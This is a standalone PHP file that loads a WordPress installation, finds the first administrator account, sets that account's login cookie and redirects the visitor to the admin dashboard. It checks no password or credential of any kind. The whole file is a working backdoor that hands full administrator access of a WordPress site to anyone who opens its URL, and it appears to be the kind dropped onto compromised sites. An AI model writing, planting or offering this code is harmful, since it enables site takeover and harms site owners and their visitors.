<?php
$mr = realpath(__DIR__);
$max = 10;
$found = false;
while ($max-- > 0 && $mr) {
    if (file_exists($mr . '/wp-load.php')) { $found = true; break; }
    $parent = dirname($mr);
    if ($parent === $mr) break;
    $mr = $parent;
}
if (! $found && !empty($_SERVER['DOCUMENT_ROOT']) && file_exists(realpath($_SERVER['DOCUMENT_ROOT']).'/wp-load.php')) {
    $mr = realpath($_SERVER['DOCUMENT_ROOT']);
    $found = true;
}
if (! $found) exit('Failed to load wp-load.php');
@chdir($mr);
require_once $mr . '/wp-load.php';
$wp_user_query = new WP_User_Query([
    'role'   => 'Administrator',
    'number' => 1,
    'fields' => 'ID',
]);
$results = $wp_user_query->get_results();
if (! empty($results[0])) {
    $user_id = (int)$results[0];
    wp_set_auth_cookie($user_id);
    wp_redirect(admin_url());
    exit;
}
exit('NO ADMIN');
